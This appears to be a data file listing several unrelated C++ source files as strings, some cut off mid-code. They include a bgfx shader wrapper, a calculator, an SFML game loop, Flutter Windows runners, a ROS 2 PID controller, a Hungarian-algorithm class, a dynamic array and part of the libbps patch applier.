    "#include \"shader.h\"\n\n#include <iostream>\n#include <stdexcept>\n#include <fstream>\n\n#include <bx/math.h>\n#include <bx/string.h>\n#include <bgfx/platform.h>\n\n#include <glm/glm.hpp>\n\n#include \"camera.h\"\n\n\n// shader things\n#include <bgfx/embedded_shader.h>\n#include <vs_cubes.sc.glsl.bin.h>\n#include <vs_cubes.sc.essl.bin.h>\n#include <vs_cubes.sc.spv.bin.h>\n#include <fs_cubes.sc.glsl.bin.h>\n#include <fs_cubes.sc.essl.bin.h>\n#include <fs_cubes.sc.spv.bin.h>\n#if defined(_WIN32)\n//#include <vs_cubes.sc.dx9.bin.h>\n#include <vs_cubes.sc.dx11.bin.h>\n//#include <fs_cubes.sc.dx9.bin.h>\n#include <fs_cubes.sc.dx11.bin.h>\n#endif //  defined(_WIN32)\n#if __APPLE__\n#include <vs_cubes.sc.mtl.bin.h>\n#include <fs.sc.mtl.bin.h>\n#endif // __APPLE__\n\nstatic const bgfx::EmbeddedShader shaders_[] =\n{\n    BGFX_EMBEDDED_SHADER(vs_cubes), BGFX_EMBEDDED_SHADER(fs_cubes), BGFX_EMBEDDED_SHADER_END()\n};\n\n\n\nShader::Shader(const char* vertex, const char* fragment)\n    //: program_(loadShaders(vertex, fragment))\n{\n    bgfx::RendererType::Enum type = bgfx::getRendererType();\n\n    program_ = bgfx::createProgram(\n        bgfx::createEmbeddedShader(shaders_, type, \"vs_cubes\"),\n        bgfx::createEmbeddedShader(shaders_, type, \"fs_cubes\"), true);\n}\n\nShader::~Shader()\n{\n    //bgfx::destroy(program_); no need\n}\n\nvoid Shader::use() const\n{\n    bgfx::submit(0, program_);\n}\n\nvoid Shader::loadProjViewMatrix(const glm::mat4& p, const glm::mat4& v)\n{\n    bgfx::setViewTransform(0, &v[0][0], &p[0][0]);\n}\n\nvoid Shader::loadModelMatrix(glm::vec3 quad)\n{\n    glm::mat4 m = glm::identity<glm::mat4>();\n\n    m = glm::translate(m, quad);\n\n    bgfx::setTransform(&m[0][0]);\n}\n\nvoid Shader::loadMatrix(const Camera& camera)\n{\n    loadProjViewMatrix(camera.getProjectionMatrix(), camera.getViewMatrix());\n}\n\n",
    "#include <iostream>\n\nusing namespace std;\n\nint main() {\n    double num1, num2;\n    char operation;\n    double result;\n\n    // Prompt user to enter two numbers\n    cout << \"Enter first number: \";\n    cin >> num1;\n\n    cout << \"Enter second number: \";\n    cin >> num2;\n\n    // Prompt user to choose an operation\n    cout << \"Choose an operation (+, -, *, /): \";\n    cin >> operation;\n\n    // Perform the operation based on user input\n    switch (operation) {\n        case '+':\n            result = num1 + num2;\n            cout << \"Result: \" << num1 << \" + \" << num2 << \" = \" << result << endl;\n            break;\n        case '-':\n            result = num1 - num2;\n            cout << \"Result: \" << num1 << \" - \" << num2 << \" = \" << result << endl;\n            break;\n        case '*':\n            result = num1 * num2;\n            cout << \"Result: \" << num1 << \" * \" << num2 << \" = \" << result << endl;\n            break;\n        case '/':\n            if (num2 != 0) {\n                result = num1 / num2;\n                cout << \"Result: \" << num1 << \" / \" << num2 << \" = \" << result << endl;\n            } else {\n                cout << \"Error: Division by zero is not allowed.\" << endl;\n            }\n            break;\n        default:\n            cout << \"Error: Invalid operation.\" << endl;\n            break;\n    }\n\n    return 0;\n}\n",
    "#include <SFML/Graphics.hpp>\r\n#include <SFML/Audio.hpp>\r\n#include \"GameSettings.h\"\r\n#include \"indicator.h\"\r\n#include \"textures.h\"\r\n#include \"Player.h\"\r\n#include \"Sounds.h\"\r\n#include \"light.h\"\r\n#include \"maps.h\"\r\n#include \"Menu.h\"\r\n#include \"text.h\"\r\n\r\nsf::RectangleShape effect;\r\nint main() {\r\n    effect.setSize(sf::Vector2f(desctopeSizeX / 2, desctopeSizeY / 2));\r\n    window.setFramerateLimit(60); \r\n    window.setVerticalSyncEnabled(settingsInfo.verticalSync);\r\n\r\nMainMenu:\r\n    camera.setSize(sf::Vector2f(desctopeSizeX, desctopeSizeY));\r\n    camera.setCenter(desctopeSizeX / 2, desctopeSizeY / 2);\r\n    window.setView(camera);\r\n    menuMusic.play();\r\n\r\n    while (window.isOpen()) {\r\n        sf::Event event; \r\n        while (window.pollEvent(event)) {\r\n            if (event.type == sf::Event::Closed)\r\n                window.close();\r\n            else if (event.type == sf::Event::Resized) {\r\n                sf::Vector2u newSize = window.getSize();\r\n                newSize.x = desctopeSizeX * window.getSize().y / desctopeSizeY;\r\n                window.setSize(newSize);\r\n            }\r\n        }\r\n        mouseX = sf::Mouse::getPosition(window).x * desctopeSizeX / window.getSize().x;\r\n        mouseY = sf::Mouse::getPosition(window).y * desctopeSizeY / window.getSize().y;\r\n\r\n        if (sf::Mouse::isButtonPressed(sf::Mouse::Left)) {\r\n            if (mouseBtn == false) {\r\n                mouseBtn = true;\r\n                mouseFirstCadr = true;\r\n            }\r\n            else\r\n                mouseFirstCadr = false;\r\n        }\r\n        else {\r\n            mouseFirstCadr = false;\r\n            mouseBtn = false;\r\n        }\r\n\r\n        window.clear();\r\n        int count = startMenu.draw(&window);\r\n        if (count != -1) {\r\n            if (pressedBtn.getStatus() != pressedBtn.Playing)\r\n                pressedBtn.play();\r\n\r\n            if (count == 0)\r\n                break;\r\n            else if (count == 1)\r\n                settings(&window);\r\n            else if (count == 2)\r\n                return 0;\r\n        }\r\n        window.display();\r\n    }\r\n    menuMusic.stop();\r\n\r\nupdateGame:\r\n    player.x = maps[player.numlvl].startX;\r\n    player.y = maps[player.numlvl].startY;\r\ngamePlay:\r\n    cave.setLoop(true);\r\n    cave.play();\r\n\r\n    camera.setSize(sf::Vector2f(desctopeSizeX / 2, desctopeSizeY / 2));\r\n\r\n    while (window.isOpen()) {\r\n        sf::Event event;\r\n        while (window.pollEvent(event)) {\r\n            if (event.type == sf::Event::Closed) {\r\n                window.close();\r\n                return 0;\r\n            }\r\n            else if (event.type == sf::Event::Resized) {\r\n                sf::Vector2u newSize = window.getSize();\r\n                newSize.x = desctopeSizeX * window.getSize().y / desctopeSizeY;\r\n                window.setSize(newSize);\r\n            }\r\n        }\r\n        // \u00ef\u00e0\u00f3\u00e7\u00e0\r\n        if (sf::Keyboard::isKeyPressed(sf::Keyboard::Escape)) {\r\n            cave.stop();\r\n            camera.setSize(sf::Vector2f(desctopeSizeX, desctopeSizeY));\r\n            camera.setCenter(desctopeSizeX * 0.5, desctopeSizeY * 0.5);\r\n            window.setView(camera);\r\n            const char* menuStrings[] = {\r\n                \"back to game\", \r\n                \"back to the main menu\",\r\n                \"save game\",\r\n                \"settings\",\r\n                \"qout\"\r\n            };\r\n            Menu pauseMenu(sf::Vector2f((desctopeSizeX * 0.5) * 0.613, desctopeSizeY * 0.5), 60, menuStrings, 5);\r\n\r\n            while (window.isOpen()) {\r\n                sf::Event event;\r\n                while (window.pollEvent(event)) {\r\n                    if (event.type == sf::Event::Closed)\r\n                        window.close();\r\n                    else if (event.type == sf::Event::Resized) {\r\n                        sf::Vector2u newSize = window.getSize();\r\n                        newSize.x = desctopeSizeX * window.getSize().y / desctopeSizeY;\r\n                        window.setSize(newSize);\r\n                    }\r\n                }\r\n                mouseX = sf::Mouse::getPosition(window).x * desctopeSizeX / window.getSize().x;\r\n                mouseY = sf::Mouse::getPosition(window).y * desctopeSizeY / window.getSize().y;\r\n\r\n                if (sf::Mouse::isButtonPressed(sf::Mouse::Left)) {\r\n                    if (mouseBtn == false) {\r\n                        mouseBtn = true;\r\n                        mouseFirstCadr = true;\r\n                    }\r\n                    else\r\n                        mouseFirstCadr = false;\r\n                }\r\n                else {\r\n                    mouseFirstCadr = false;\r\n                    mouseBtn = false;\r\n                }\r\n\r\n                window.clear();\r\n\r\n                int count = pauseMenu.draw(&window); // \u00e5\u00f1\u00eb\u00e8 \u00ea\u00ed\u00ee\u00ef\u00ea\u00e0 \u00ed\u00e0\u00e6\u00e0\u00f2\u00e0, \u00f2\u00ee \u00e2\u00e5\u00f0\u00ed\u00b8\u00f2 \u00e5\u00b8 \u00ed\u00ee\u00ec\u00e5\u00f0, \u00e5\u00f1\u00eb\u00e8 \u00ed\u00e5\u00f2, \u00f2\u00ee -1\r\n                if (count != -1) {\r\n                    if (pressedBtn.getStatus() != pressedBtn.Playing)\r\n                        pressedBtn.play();\r\n\r\n                    if (count == 0)\r\n                        goto game",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"eco_routing\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"geometry_msgs/msg/twist.hpp\"\n#include \"nav_msgs/msg/odometry.hpp\"\n#include \"rclcpp/rclcpp.hpp\"\n#include \"tf2/LinearMath/Quaternion.h\"\n#include \"tf2_geometry_msgs/tf2_geometry_msgs.hpp\"\n#include <chrono>\n#include <cmath>\n#include <vector>\n\nclass TurnController : public rclcpp::Node {\npublic:\n  TurnController(int scene_number)\n      : Node(\"turn_controller\"), current_goal_index_(0),\n        scene_number_(scene_number), kp_(2.0), ki_(0.0), kd_(0.05),\n        integral_(0.0), prev_error_(0.0), current_yaw_(0.0), current_x_(0.0),\n        current_y_(0.0) {\n\n    setWaypoints();\n\n    velocity_publisher_ =\n        this->create_publisher<geometry_msgs::msg::Twist>(\"cmd_vel\", 10);\n    odom_subscriber_ = this->create_subscription<nav_msgs::msg::Odometry>(\n        \"/rosbot_xl_base_controller/odom\", 10,\n        std::bind(&TurnController::odomCallback, this, std::placeholders::_1));\n\n    timer_ =\n        this->create_wall_timer(std::chrono::milliseconds(50),\n                                std::bind(&TurnController::controlLoop, this));\n  }\n\nprivate:\n  void setWaypoints() {\n    switch (scene_number_) {\n    case 1: // Simulation\n      waypoints_ = {{1.5, -0.9}, {1.65, -0.5}, {1.38, 0.43}};\n      break;\n    case 2: // CyberWorld\n      waypoints_ = {{1.0, -0.5}, {0.0, -1.2}};\n      break;\n    default:\n      RCLCPP_ERROR(this->get_logger(), \"Invalid scene number: %d\",\n                   scene_number_);\n      rclcpp::shutdown();\n    }\n  }\n\n  void odomCallback(const nav_msgs::msg::Odometry::SharedPtr msg) {\n    tf2::Quaternion q(\n        msg->pose.pose.orientation.x, msg->pose.pose.orientation.y,\n        msg->pose.pose.orientation.z, msg->pose.pose.orientation.w);\n    tf2::Matrix3x3 m(q);\n    double roll, pitch;\n    m.getRPY(roll, pitch, current_yaw_);\n    current_x_ = msg->pose.pose.position.x;\n    current_y_ = msg->pose.pose.position.y;\n  }\n\n  void controlLoop() {\n    if (current_goal_index_ >= static_cast<int>(waypoints_.size())) {\n      RCLCPP_INFO(this->get_logger(), \"All waypoints faced.\");\n      rclcpp::shutdown();\n      return;\n    }\n\n    double target_angle =\n        std::atan2(waypoints_[current_goal_index_].second - current_y_,\n                   waypoints_[current_goal_index_].first - current_x_);\n\n    double error = target_angle - current_yaw_;\n    if (error > M_PI)\n      error -= 2 * M_PI;\n    if (error < -M_PI)\n      error += 2 * M_PI;\n\n    double P_out = kp_ * error;\n    integral_ += error * 0.05; // assuming control loop runs at 20Hz\n    double I_out = ki_ * integral_;\n    double derivative = (error - prev_error_) / 0.05;\n    double D_out = kd_ * derivative;\n\n    double output = P_out + I_out + D_out;\n    auto message = geometry_msgs::msg::Twist();\n    message.angular.z = output;\n    velocity_publisher_->publish(message);\n\n    prev_error_ = error;\n\n    if (std::abs(error) < 0.01) {\n      current_goal_index_++;\n      message.angular.z = 0.0;\n      velocity_publisher_->publish(message);\n      RCLCPP_INFO(this->get_logger(), \"Waypoint %d reached.\",\n                  current_goal_index_);\n    }\n  }\n\n  rclcpp::Publisher<geometry_msgs::msg::Twist>::SharedPtr velocity_publisher_;\n  rclcpp::Subscription<nav_msgs::msg::Odometry>::SharedPtr odom_subscriber_;\n  rclcpp::TimerBase::SharedPtr timer_;\n\n  std::vector<std::pair<double, double>> waypoints_;\n  int current_goal_index_;\n  int scene_number_;\n\n  double kp_, ki_, kd_;\n  double integral_, prev_error_;\n  double current_yaw_, current_x_, current_y_;\n};\n\nint main(int argc, char *argv[]) {\n  rclcpp::init(argc, argv);\n\n  int scene_number = 1; // Default to simulation\n  if (argc > 1) {\n    scene_number = std::atoi(argv[1]);\n  }\n\n  auto node = std::make_shared<TurnController>(scene_number);\n  rclcpp::spin(node);\n  rclcpp::shutdown();\n  return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"shark\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <math.h>\n#include <set>\n#include <limits.h>\n\nusing namespace std;\n\nclass graph{\n    public:\n    void getting_input();\n    void hungarian_algorithm();\n    private:\n    int number_of_nodes;\n    vector<vector<int>> adj_matrix;\n    vector<vector<int>> x;\n    vector<int> u;\n    vector<int> v;\n    vector<int> mates;\n    vector<int> p;\n    vector<int> pi;\n    set<int> L_set;\n    vector<int> label;\n    int cards;\n    int path;\n    void initialize_dual();\n    void initialize_primal();\n    void finding_path_part1();\n    void finding_path_part2();\n    void finding_path_part2_1(int k);\n    void finding_path_part2_2(int k);\n    void iteration_dual();\n    void iteration_primal();\n};\n\nvoid graph :: getting_input(){\n    cin >> this -> number_of_nodes;\n    this -> adj_matrix.assign(number_of_nodes, vector<int>(number_of_nodes, 0));\n    this -> x.assign(number_of_nodes, vector<int>(number_of_nodes, 0));\n    this -> u.assign(number_of_nodes, INT_MAX);\n    this -> v.assign(number_of_nodes, INT_MAX);\n    int x = 0;\n    for(int i = 0; i < number_of_nodes; i++){\n        for(int j = 0; j < number_of_nodes; j++){\n            cin >> this -> adj_matrix[i][j];\n            this -> u[i] = min(u[i], adj_matrix[i][j]);\n        }\n    }\n}\n\nvoid graph :: initialize_dual(){\n    for(int j = 0; j < number_of_nodes; j++){\n        this -> v[j] = this -> adj_matrix[j][j] - this -> u[j];\n        for(int i = 0; i < number_of_nodes; i++){\n            this -> v[j] = min(this -> v[j], this -> adj_matrix[i][j] - this -> u[i]);\n        }\n    }\n}\n\nvoid graph :: initialize_primal(){\n    this -> mates.assign(2 * this -> number_of_nodes, 0);\n    this -> cards = 0;\n    for(int i = 0; i < number_of_nodes; i++){\n        for(int j = 0; j < number_of_nodes; j++){\n            if((this->adj_matrix[i][j]-this->u[i]-this->v[j] == 0) && (mates[i] == 0) && (mates[j+number_of_nodes] == 0)){\n                this -> x[i][j] = 1;\n                this -> cards += 1;\n                mates[i] = j + 1;\n                mates[j + number_of_nodes] = i + 1; \n            }\n        }\n    }\n}\n\nvoid graph :: finding_path_part1(){\n    this -> label.assign(2*number_of_nodes, -1);\n    this -> L_set.clear();\n    this -> p.assign(number_of_nodes, INT_MAX);\n    this -> pi.assign(number_of_nodes, 0);\n    for(int i = 0; i < number_of_nodes; i++){\n        if(this -> mates[i] == 0){\n            this -> label[i] = 0;\n            this -> L_set.insert(i + 1);\n            for(int j = 0; j < number_of_nodes; j++){\n                if(this -> label[j + number_of_nodes] == -1){\n                    if(this -> adj_matrix[i][j] - this -> u[i] - this -> v[j] < this -> p[j]){\n                        this -> p[j] = this -> adj_matrix[i][j] - this -> u[i] - this -> v[j];\n                        this -> pi[j] = i + 1;\n                    }\n                }\n            }\n        }\n    }\n}\n\nvoid graph :: finding_path_part2_1(int k){\n    for(int j = 0; j < number_of_nodes; j++){\n        if((label[j+number_of_nodes] == -1) && (this -> adj_matrix[k][j] - this -> u[k] - this -> v[j] == 0)){\n            this -> label[j + number_of_nodes] = k;\n            this -> L_set.insert(j + number_of_nodes + 1);\n        }\n    }\n}\n\nvoid graph :: finding_path_part2_2(int k){\n    if(this -> label[mates[k]-1] == -1){\n        this -> label[mates[k]-1] = k;\n        this -> L_set.insert(mates[k]);\n        for(int j = 0; j < number_of_nodes; j++){\n            if(label[j+number_of_nodes] == -1){\n                if(this -> adj_matrix[mates[k]-1][j] - this -> u[mates[k]-1] - v[j] < p[j]){\n                    p[j] = adj_matrix[mates[k]-1][j] - u[mates[k]-1]-v[j];\n                    pi[j] = mates[k];\n                }\n            }\n        }\n    }\n}\n\nvoid graph :: finding_path_part2(){\n    int k = *(this -> L_set.begin()) - 1;\n    this -> L_set.erase(this -> L_set.begin());\n    if(k < number_of_nodes){\n        finding_path_part2_1(k);\n    }\n    else if(mates[k] != 0){\n        finding_path_part2_2(k);\n    }\n    else{\n        this -> path = k;\n    }\n}\n\nvoid graph :: iteration_dual(){\n    int delta = this -> p[0];\n    for(int j = 0; j < number_of_nodes; j++){\n        if(label[j + number_of_nodes] == -1){\n            delta = min(this -> p[j], delta);\n        }\n    }\n    for(int i = 0; i < number_of_nodes; i++){\n        if(label[i] != -1){\n            u[i] += delta;\n        }\n    }\n    for(int j = 0; j < number_of_nodes; j++){\n        if(label[j + number_of_nodes] != -1){\n            v[j] -= delta;\n        }\n        else{\n            p[j] -= delta;\n        }\n    }\n    for(int j = 0; j < number_of_nodes; j++){\n        if((label[j + number_of_nodes] == -1) && (p[j] == 0)){\n            label[j + number_of_nodes] = pi[j]-1;\n            L_set.insert(j + number_of_nodes + 1);\n        }\n    }\n}\n\nvoid graph :: iteration_primal(){\n    int j = this -> path;\n    while(j != 0){\n        int i = label[j];\n        if(j < number_of_nodes && i >= number_of_nodes){\n            mates[i] = j+1;\n  ",
    "#include <iostream>\r\nusing namespace std ;\r\nclass DynamicArray {\r\nprivate:\r\n    int* array;\r\n    size_t capacity;\r\n    size_t size;\r\n    double resizeFactor;\r\n\r\n    void resize() {\r\n        size_t newCapacity = static_cast<size_t>(capacity * resizeFactor);\r\n        int* newArray = new int[newCapacity];\r\n\r\n        for (size_t i = 0; i < size; i++) {\r\n            newArray[i] = array[i];\r\n        }\r\n\r\n        delete[] array;\r\n        array = newArray;\r\n        capacity = newCapacity;\r\n    }\r\n\r\npublic:\r\n    DynamicArray(size_t initialCapacity = 10, double resizeFactor = 1.5) \r\n        : capacity(initialCapacity), size(0), resizeFactor(resizeFactor) {\r\n        array = new int[capacity];\r\n    }\r\n\r\n    ~DynamicArray() {\r\n        delete[] array;\r\n    }\r\n\r\n    //Inserts an element at the specified index.\r\n\r\n    void insertAt(size_t index, int value) {\r\n        if (index > size) {\r\n            std::cerr << \"Index out of range\\n\";\r\n            return;\r\n        }\r\n        if (size == capacity) resize();\r\n        for (size_t i = size; i > index; i--) {\r\n            array[i] = array[i - 1];\r\n        }\r\n        array[index] = value;\r\n        size++;\r\n    }\r\n\r\n    // o Deletes the element at the specified index.\r\n\r\n    void deleteAt(size_t index) {\r\n        if (index >= size) {\r\n            std::cerr << \"Index out of range\\n\";\r\n            return;\r\n        }\r\n        for (size_t i = index; i < size - 1; i++) {\r\n            array[i] = array[i + 1];\r\n        }\r\n        size--;\r\n    }\r\n\r\n    //  Returns the size of the dynamic array\r\n\r\n    size_t getSize() const {\r\n        return size;\r\n    }\r\n\r\n    //  Returns true if the dynamic array is empty, false otherwise\r\n\r\n    bool isEmpty() const {\r\n        return size == 0;\r\n    }\r\n\r\n    //  Rotates the dynamic array by k positions to the right.\r\n\r\n    void rotateRight(size_t k) {\r\n        if (size == 0) return;\r\n        k = k % size;\r\n        int* temp = new int[k];\r\n        for (size_t i = 0; i < k; i++) {\r\n            temp[i] = array[size - k + i];\r\n        }\r\n        for (size_t i = size - 1; i >= k; i--) {\r\n            array[i] = array[i - k];\r\n        }\r\n        for (size_t i = 0; i < k; i++) {\r\n            array[i] = temp[i];\r\n        }\r\n        delete[] temp;\r\n    }\r\n\r\n    //  Reverses the dynamic array.\r\n\r\n    void reverse() {\r\n        for (size_t i = 0; i < size / 2; i++) {\r\n            int temp = array[i];\r\n            array[i] = array[size - 1 - i];\r\n            array[size - 1 - i] = temp;\r\n        }\r\n    }\r\n\r\n    //  Appends an element to the end of the dynamic array.\r\n\r\n\r\n    void append(int value) {\r\n        if (size == capacity) resize();\r\n        array[size++] = value;\r\n    }\r\n\r\n    //  Prepends an element to the beginning of the dynamic array.\r\n\r\n    void prepend(int value) {\r\n        insertAt(0, value);\r\n    }\r\n\r\n    // Merges two dynamic arrays into a single dynamic array.\r\n\r\n    static DynamicArray merge(const DynamicArray& a, const DynamicArray& b) {\r\n        DynamicArray result(a.size + b.size);\r\n        for (size_t i = 0; i < a.size; i++) {\r\n            result.append(a.array[i]);\r\n        }\r\n        for (size_t i = 0; i < b.size; i++) {\r\n            result.append(b.array[i]);\r\n        }\r\n        return result;\r\n    }\r\n    // Interleaves two dynamic arrays into a single dynamic array.\r\n    static DynamicArray interleave(const DynamicArray& a, const DynamicArray& b) {\r\n        size_t newSize = a.size + b.size;\r\n        DynamicArray result(newSize);\r\n        size_t minSize = a.size < b.size ? a.size : b.size;\r\n        size_t i = 0;\r\n        for (; i < minSize; i++) {\r\n            result.append(a.array[i]);\r\n            result.append(b.array[i]);\r\n        }\r\n        for (; i < a.size; i++) {\r\n            result.append(a.array[i]);\r\n        }\r\n        for (; i < b.size; i++) {\r\n            result.append(b.array[i]);\r\n        }\r\n        return result;\r\n    }\r\n\r\n    // Returns the middle element of the dynamic array.\r\n\r\n    int middleElement() const {\r\n        if (size == 0) {\r\n            std::cerr << \"Array is empty\\n\";\r\n            return -1;\r\n        }\r\n        return array[size / 2];\r\n    }\r\n\r\n    // Returns the index of the first occurrence of the specified element in the dynamic \r\narray, or -1 if the element is not found.\r\n\r\n    int indexOf(int value) const {\r\n        for (size_t i = 0; i < size; i++) {\r\n            if (array[i] == value) {\r\n                return static_cast<int>(i);\r\n            }\r\n        }\r\n        return -1;\r\n    }\r\n\r\n    // Splits the dynamic array into two dynamic arrays at the specified index.\r\n\r\n    void splitAt(size_t index, DynamicArray& first, DynamicArray& second) const {\r\n        if (index > size) {\r\n            std::cerr << \"Index out of range\\n\";\r\n            return;\r\n        }\r\n        first = DynamicArray(index);\r\n        second = DynamicArray(size - index);\r\n        for (size_t i = 0; i < index; i++) {\r\n            first.append(array[i]);\r\n        }\r\n        for (size_t i = index; i < size; i++) {\r\n            second.appen",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"places_auto_suggestion\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\n#include <camera/PerspecCamera.h>\n#include <control/FPScontrol.h>\n#include <geometry/BoxGeometry.h>\n#include <material/CommonMaterial.h>\n#include <core/Renderer.h>\n#include <core/Scene.h>\n#include <core/Window.h>\n#include <core/Context.h>\n#include <texture/ImageTexture.h>\n\n\n#include <util/Logger.h>\nusing namespace SA;\n\nint main()\n{\n  Window window(1920, 1080, 400, 200);\n  Context& ctx = window.context;\n  Renderer renderer;\n  FPSControl control;\n  PerspecCamera camera(45.0, 1920.0 / 1080.0, 0.01, 100.0);\n\n\n  camera.setPosition(glm::vec3(0, 0, 5));\n  control.bindObject(&camera);\n  control.bindWindow(&window);\n  control.mouse_sensitivity = 0.002;\n\n\n  Scene scene;\n\n  auto* box = new Object3D(new BoxGeometry(),\n    new CommonMaterial(\n      {\n        {\"diffuse\", new ImageTexture(\"static/image/awesomeface.png\")}\n      }\n    )\n  );\n\n  scene.add(box);\n\n  ctx.loop = [&](double delta) {\n\n\n    logger.log(camera.getDirection(), \"main()::cam dir\");\n    renderer.render(scene, camera);\n  };\n\n  ctx.loop.get()(0.0);\n\n\n\n  return 0;\n}",
    "// Module name: libbps\n// Author: Alcaro\n// Date: November 7, 2015\n// Licence: GPL v3.0 or higher\n\n#include \"flips/libbps.h\"\n#include \"flips/crc32.h\"\n#include <sead/heap/seadHeapMgr.h>\n\n#include <stdint.h> //uint8_t, uint32_t\n#include <string.h> //memcpy, memset\n\nstatic void* mallocImpl(size_t size)\n{\n    return sead::HeapMgr::instance()->getCurrentHeap()->alloc(size, 8);\n}\n\nstatic void freeImpl(void* ptr)\n{\n    return sead::HeapMgr::instance()->getCurrentHeap()->free(ptr);\n}\n\nstatic void* reallocImpl(void* ptr, size_t size)\n{\n    return sead::HeapMgr::instance()->getCurrentHeap()->tryRealloc(ptr, size, 8);\n}\n\nstatic uint32_t read32(uint8_t* ptr)\n{\n    uint32_t out;\n    out = ptr[0];\n    out |= ptr[1] << 8;\n    out |= ptr[2] << 16;\n    out |= ptr[3] << 24;\n    return out;\n}\n\nenum { SourceRead,\n    TargetRead,\n    SourceCopy,\n    TargetCopy };\n\nstatic bool try_add(size_t& a, size_t b)\n{\n    if (SIZE_MAX - a < b)\n        return false;\n    a += b;\n    return true;\n}\n\nstatic bool try_shift(size_t& a, size_t b)\n{\n    if (SIZE_MAX >> b < a)\n        return false;\n    a <<= b;\n    return true;\n}\n\nstatic bool decodenum(const uint8_t*& ptr, size_t& out)\n{\n    out = 0;\n    unsigned int shift = 0;\n    while (true) {\n        uint8_t next = *ptr++;\n        size_t addthis = (next & 0x7F);\n        if (shift)\n            addthis++;\n        if (!try_shift(addthis, shift))\n            return false;\n        // unchecked because if it was shifted, the lowest bit is zero, and if not, it's <=0x7F.\n        if (!try_add(out, addthis))\n            return false;\n        if (next & 0x80)\n            return true;\n        shift += 7;\n    }\n}\n\n#define error(which)   \\\n    do {               \\\n        error = which; \\\n        goto exit;     \\\n    } while (0)\n#define assert_sum(a, b)          \\\n    do {                          \\\n        if (SIZE_MAX - (a) < (b)) \\\n            error(bps_too_big);   \\\n    } while (0)\n#define assert_shift(a, b)         \\\n    do {                           \\\n        if (SIZE_MAX >> (b) < (a)) \\\n            error(bps_too_big);    \\\n    } while (0)\nenum bpserror bps_apply(struct mem patch, struct mem in, struct mem* out, struct mem* metadata, bool accept_wrong_input)\n{\n    enum bpserror error = bps_ok;\n    out->len = 0;\n    out->ptr = NULL;\n    if (metadata) {\n        metadata->len = 0;\n        metadata->ptr = NULL;\n    }\n    if (patch.len < 4 + 3 + 12)\n        return bps_broken;\n\n    if (true) {\n#define read8() (*(patchat++))\n#define decodeto(var)                 \\\n    do {                              \\\n        if (!decodenum(patchat, var)) \\\n            error(bps_too_big);       \\\n    } while (false)\n#define write8(byte) (*(outat++) = byte)\n\n        const uint8_t* patchat = patch.ptr;\n        const uint8_t* patchend = patch.ptr + patch.len - 12;\n\n        if (read8() != 'B')\n            error(bps_broken);\n        if (read8() != 'P')\n            error(bps_broken);\n        if (read8() != 'S')\n            error(bps_broken);\n        if (read8() != '1')\n            error(bps_broken);\n\n        uint32_t crc_in_e = read32(patch.ptr + patch.len - 12);\n        uint32_t crc_out_e = read32(patch.ptr + patch.len - 8);\n       